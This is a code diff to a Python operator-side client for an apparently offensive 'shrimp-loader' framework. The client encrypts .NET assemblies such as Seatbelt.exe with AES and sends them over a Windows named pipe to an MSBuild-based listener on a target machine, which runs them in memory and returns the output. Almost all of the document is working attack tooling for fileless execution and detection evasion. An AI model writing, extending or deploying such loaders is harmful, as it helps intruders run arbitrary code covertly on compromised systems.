@@ -1,27 +1,48 @@
+#!/usr/bin/env python3
 """
-Named Pipe Client — sends a .NET assembly to the pipe listener for in-memory execution.
-Usage: python pipe_client.py <pipe_name> <assembly_path> [args...]
+Named Pipe Client -- sends .NET assemblies to the pipe listener for in-memory execution.
 
-This is the operator-side tool: reads an assembly from disk on YOUR machine,
-sends the raw bytes over a named pipe to the target's loader, and receives output.
+Usage:
+  python pipe_client.py <pipe_name> <assembly_path> [options] [-- <assembly_args>...]
+  python pipe_client.py <pipe_name> --quit
+
+Protocol (matches msbuild_listener.csproj):
+  Send: [4B assembly_len][encrypted_bytes][4B argc][string args...][string typeName][string methodName]
+  Recv: [string output][4B exit_code]
+  Quit: [4B 0x00000000]
+  String = [4B len][UTF-8 bytes]
+
+Examples:
+  python pipe_client.py shrimploader Seatbelt.exe --key <hex> --iv <hex> -- -group=all
+  python pipe_client.py shrimploader MyLib.dll --key <hex> --iv <hex> --type NS.Class --method Run
+  python pipe_client.py shrimploader --quit
 """
 
+import argparse
+import os
 import struct
 import sys
-import os
 
-def send_assembly(pipe_name: str, assembly_path: str, args: list[str], xor_key: bytes = None):
-    """Send an assembly to the named pipe listener and receive output."""
 
-    with open(assembly_path, "rb") as f:
-        assembly_bytes = f.read()
+def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.primitives import padding
+    except ImportError:
+        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
+        print("    Install with: pip install cryptography", file=sys.stderr)
+        sys.exit(1)
 
-    if xor_key:
-        assembly_bytes = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(assembly_bytes))
+    padder = padding.PKCS7(128).padder()
+    padded = padder.update(data) + padder.finalize()
 
-    # Connect to named pipe (Windows)
-    pipe_path = rf"\\.\pipe\{pipe_name}"
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    encryptor = cipher.encryptor()
+    return encryptor.update(padded) + encryptor.finalize()
 
+
+def connect_pipe(pipe_path):
+    """Connect to a named pipe, returns (handle, write_fn, read_fn, close_fn)."""
     try:
         import win32file
         handle = win32file.CreateFile(
@@ -32,31 +53,19 @@ def send_assembly(pipe_name: str, assembly_path: str, args: list[str], xor_key: 
             0, None
         )
 
-        # Send: [4B assembly len][assembly bytes][4B arg count][for each: 4B len + arg bytes]
-        win32file.WriteFile(handle, struct.pack("<I", len(assembly_bytes)))
-        win32file.WriteFile(handle, assembly_bytes)
-        win32file.WriteFile(handle, struct.pack("<I", len(args)))
+        def write_bytes(data):
+            win32file.WriteFile(handle, data)
 
-        for arg in args:
-            arg_bytes = arg.encode("utf-8")
-            win32file.WriteFile(handle, struct.pack("<I", len(arg_bytes)))
-            win32file.WriteFile(handle, arg_bytes)
+        def read_bytes(n):
+            _, data = win32file.ReadFile(handle, n)
+            return data
 
-        # Receive output
-        _, output_len_bytes = win32file.ReadFile(handle, 4)
-        output_len = struct.unpack("<I", output_len_bytes)[0]
-        _, output_bytes = win32file.ReadFile(handle, output_len)
-        _, exit_code_bytes = win32file.ReadFile(handle, 4)
-        exit_code = struct.unpack("<i", exit_code_bytes)[0]
+        def close():
+            win32file.CloseHandle(handle)
 
-        print(output_bytes.decode("utf-8", errors="replace"))
-        print(f"[*] Exit code: {exit_code}")
-
-        win32file.CloseHandle(handle)
-        return exit_code
+        return handle, write_bytes, read_bytes, close
 
     except ImportError:
-        # Fallback using ctypes for environments without pywin32
         import ctypes
         from ctypes import wintypes
 
@@ -71,50 +80,160 @@ def send_assembly(pipe_name: str, assembly_path: str, args: list[str], xor_key: 
             0, None, OPEN_EXISTING, 0, None
         )
         if handle == INVALID_HANDLE_VALUE:
-            print(f"[-] Cannot connect to pipe: {pipe_name}")
-            return 1
+            return None, None, None, None
 
-        def write_bytes(h, data):
+        def write_bytes(data):
             written = wintypes.DWORD()
-            kernel32.WriteFile(h, data, len(data), ctypes.byref(written), None)
+            kernel32.WriteFile(handle, data, len(data), ctypes.byref(written), None)
 
-        def read_bytes(h, n):
+        def read_bytes(n):
             buf = ctypes.create_string_buffer(n)
             read = wintypes.DWORD()
-            kernel32.ReadFile(h, buf, n, ctypes.byref(read), None)
+            kernel32.ReadFile(handle, buf, n, ctypes.byref(read), None)
             return buf.raw[:read.value]
 
-        write_bytes(handle, struct.pack("<I", len(assembly_bytes)))
-        write_bytes(handle, assembly_bytes)
-        write_bytes(handle, struct.pack("<I", len(args)))
-        for arg in args:
-            arg_bytes = arg.encode("utf-8")
-            write_bytes(handle, struct.pack("<I", len(arg_bytes)))
-            write_bytes(handle, arg_bytes)
+        def close():
+            kernel32.CloseHandle(handle)
 
-        output_len = struct.unpack("<I", read_bytes(handle, 4))[0]
-        output = read_bytes(handle, output_len)
-        exit_code = struct.unpack("<i", read_bytes(handle, 4))[0]
+        return handle, write_bytes, read_bytes, close
 
-        print(output.decode("utf-8", errors="replace"))
-        print(f"[*] Exit code: {exit_code}")
 
-        kernel32.CloseHandle(handle)
-        return exit_code
+def write_int32(write_fn, val):
+    write_fn(struct.pack("<i", val))
+
+
+def write_string(write_fn, s):
+    data = s.encode("utf-8")
+    write_int32(write_fn, len(data))
+    if data:
+        write_fn(data)
+
+
+def read_int32(read_fn):
+    return struct.unpack("<i", read_fn(4))[0]
+
+
+def read_string(read_fn):
+    length = read_int32(read_fn)
+    if length == 0:
+        return ""
+    return read_fn(length).decode("utf-8", errors="replace")
+
+
+def send_quit(pipe_name):
+    """Send quit sentinel (assembly_len == 0) to shut down the listener."""
+    pipe_path = rf"\\.\pipe\{pipe_name}"
+    handle, write_fn, _, close_fn = connect_pipe(pipe_path)
+    if handle is None:
+        print(f"[-] Cannot connect to pipe: {pipe_name}", file=sys.stderr)
+        return 1
+
+    write_int32(write_fn, 0)
+    close_fn()
+    print(f"[+] Quit signal sent to pipe: {pipe_name}", file=sys.stderr)
+    return 0
+
+
+def send_assembly(pipe_name, assembly_path, key, iv, args, type_name="", method_name=""):
+    """Encrypt and send an assembly to the pipe listener, receive output."""
+    with open(assembly_path, "rb") as f:
+        assembly_bytes = f.read()
+
+    print(f"[*] Assembly: {assembly_path} ({len(assembly_bytes)} bytes)", file=sys.stderr)
+
+    encrypted = aes_encrypt(assembly_bytes, key, iv)
+    print(f"[*] Encrypted: {len(encrypted)} bytes", file=sys.stderr)
+
+    pipe_path = rf"\\.\pipe\{pipe_name}"
+    handle, write_fn, read_fn, close_fn = connect_pipe(pipe_path)
+    if handle is None:
+        print(f"[-] Cannot connect to pipe: {pipe_name}", file=sys.stderr)
+        return 1
+
+    # Send encrypted assembly
+    write_int32(write_fn, len(encrypted))
+    write_fn(encrypted)
+
+    # Send args
+    write_int32(write_fn, len(args))
+    for arg in args:
+        write_string(write_fn, arg)
+
+    # Send type/method (empty string = use EntryPoint)
+    write_string(write_fn, type_name)
+    write_string(write_fn, method_name)
+
+    # Receive output
+    output = read_string(read_fn)
+    exit_code = read_int32(read_fn)
+
+    if output:
+        print(output, end="")
+    print(f"[*] Exit code: {exit_code}", file=sys.stderr)
+
+    close_fn()
+    return exit_code
+
+
+def main():
+    argv = sys.argv[1:]
+    assembly_args = []
+    if "--" in argv:
+        split_idx = argv.index("--")
+        assembly_args = argv[split_idx + 1:]
+        argv = argv[:split_idx]
+
+    parser = argparse.ArgumentParser(
+        description="Send .NET assemblies to the shrimp-loader pipe listener"
+    )
+    parser.add_argument("pipe_name", help="Named pipe name (e.g. shrimploader)")
+    parser.add_argument("assembly", nargs="?", help="Path to .NET assembly")
+    parser.add_argument("--key", required=False, help="AES-256 key as hex (64 chars)")
+    parser.add_argument("--iv", required=False, help="AES IV as hex (32 chars)")
+    parser.add_argument("--type", help="Type name for DLL invocation (e.g. Namespace.Class)")
+    parser.add_argument("--method", help="Method name for DLL invocation (e.g. Execute)")
+    parser.add_argument("--quit", action="store_true", help="Send quit signal to listener")
+    args = parser.parse_args(argv)
+
+    if args.quit:
+        sys.exit(send_quit(args.pipe_name))
+
+    if not args.assembly:
+        parser.error("assembly is required (unless using --quit)")
+
+    if not os.path.exists(args.assembly):
+        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
+        sys.exit(1)
+
+    if not args.key or not args.iv:
+        print("[-] --key and --iv are required (use values from build_msbuild.py output)",
+              file=sys.stderr)
+        sys.exit(1)
+
+    key = bytes.fromhex(args.key)
+    iv = bytes.fromhex(args.iv)
+
+    if len(key) != 32:
+        print(f"[-] AES-256 key must be 32 bytes (64 hex chars), got {len(key)}", file=sys.stderr)
+        sys.exit(1)
+    if len(iv) != 16:
+        print(f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}", file=sys.stderr)
+        sys.exit(1)
+
+    if (args.type is None) != (args.method is None):
+        print("[-] --type and --method must be specified together.", file=sys.stderr)
+        sys.exit(1)
+
+    exit_code = send_assembly(
+        args.pipe_name,
+        args.assembly,
+        key, iv,
+        assembly_args,
+        type_name=args.type or "",
+        method_name=args.method or "",
+    )
+    sys.exit(exit_code)
 
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f"Usage: {sys.argv[0]} <pipe_name> <assembly_path> [args...]")
-        sys.exit(1)
-
-    pipe_name = sys.argv[1]
-    assembly_path = sys.argv[2]
-    args = sys.argv[3:]
-
-    if not os.path.exists(assembly_path):
-        print(f"[-] Assembly not found: {assembly_path}")
-        sys.exit(1)
-
-    exit_code = send_assembly(pipe_name, assembly_path, args)
-    sys.exit(exit_code)
+    main()
